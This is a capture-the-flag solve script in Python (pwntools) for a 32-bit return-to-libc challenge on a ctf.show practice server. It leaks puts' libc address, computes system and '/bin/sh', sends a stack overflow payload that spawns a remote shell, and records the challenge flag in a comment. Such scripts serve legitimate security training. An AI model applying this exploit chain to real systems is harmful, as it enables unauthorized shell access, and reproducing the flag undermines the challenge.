#pwn52 ret2libc 32
from pwn import *
from LibcSearcher import *

e = ELF('./pwn')
p = remote('pwn.challenge.ctf.show', 28127)

offset = 0x6C + 0x4
puts_got = e.got['puts']
puts_plt = e.plt['puts']
main = e.symbols['main']

payload1 = b'a' * offset + p32(puts_plt) + p32(main) + p32(puts_got)
p.recvuntil("What do you want?")
p.sendline(payload1)
puts_addr = u32(p.recvuntil('\xf7')[-4:])
print(hex(puts_addr))

libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
sys_addr = libc_base + libc.dump('system')
sh_addr = libc_base + libc.dump('str_bin_sh')

payload2 = b'a' * offset + p32(sys_addr) + p32(0) + p32(sh_addr)
p.recvuntil("What do you want?")
p.sendline(payload2)
p.interactive()
#ctfshow{7a807ceb-88c5-4c8d-950d-3e7c8444111a}